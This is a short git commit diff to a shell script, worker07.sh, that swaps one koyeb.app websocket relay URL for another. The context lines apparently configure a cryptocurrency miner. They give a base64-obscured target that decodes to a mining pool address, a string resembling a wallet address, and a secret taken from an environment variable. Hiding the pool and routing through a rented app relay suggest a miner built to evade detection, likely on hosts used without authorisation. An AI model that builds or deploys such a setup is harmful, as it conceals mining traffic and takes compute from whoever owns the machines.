335969368ef0257912f5d1585723bc024b1a19d1
mrsilkin9-blip <mr.silkin9@fasdeil.com>
2026-07-14 17:30:04 +0700

    Update worker07.sh

--- worker07.sh
+++ worker07.sh
@@ -19,7 +19,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=wss://preferred-callida-mono-e9a2882f.koyeb.app
+echo "SERVER_WS=wss://supporting-susan-volvo-d910cf7c.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
